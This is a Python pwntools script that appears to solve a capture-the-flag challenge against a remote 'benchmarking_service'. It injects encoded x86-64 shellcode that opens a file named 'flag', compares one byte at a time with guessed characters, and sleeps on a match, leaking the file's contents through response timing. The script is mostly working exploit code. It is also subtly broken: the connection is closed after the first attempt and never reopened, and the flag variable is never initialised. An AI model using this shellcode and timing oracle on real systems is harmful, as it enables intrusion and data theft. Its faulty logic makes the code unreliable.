from pwn import *
from time import time


context.clear(arch='amd64',os='linux')
run_local = False
if run_local:
	p= process('./benchmarking_service')
else:
	p=remote("bin2.ctf.offdef.it",4001)

for index in range(30, 40):
    for char_value in range(32, 126):


        byte_index = index.to_bytes(1, 'big')
        byte_char_value = char_value.to_bytes(1, 'big')

        shellcode = b"\x31\xC0\xFF\xC0\xFF\xC0\x31\xF6\x48\xC7\xC3\x66\x6C\x61\x67\x53\x48\x89\xE7\x0F\x05\x48\x89\xC7\x31\xC0\x48\x89\xE6\xBA\x20\x00\x00\x00\x0F\x05\x48\x31\xFF\x48\x83\xC6" + \
            byte_index + b"\x40\x8A\xBE\x00\x00\x00\x00\x40\x80\xFF" + byte_char_value + \
            b"\x75\x1E\x4D\x31\xE4\x41\x54\x48\xC7\xC7\x01\x00\x00\x00\x57\xB8\x23\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x90"
        p.recvuntil(b"Shellcode: ")

        shellcode = shellcode.ljust(1024, b"\x90")
        p.send(pwnlib.encoders.encoder.alphanumeric(shellcode))

        p.recvuntil(b"Time: ")

        time_obtained = float(p.recvline())

        p.close()

        if time_obtained > 1:
            flag = flag + byte_char_value
            print("FLAG UPDATED: " + str(flag))
            break

print("FLAG FINAL: " + str(flag))
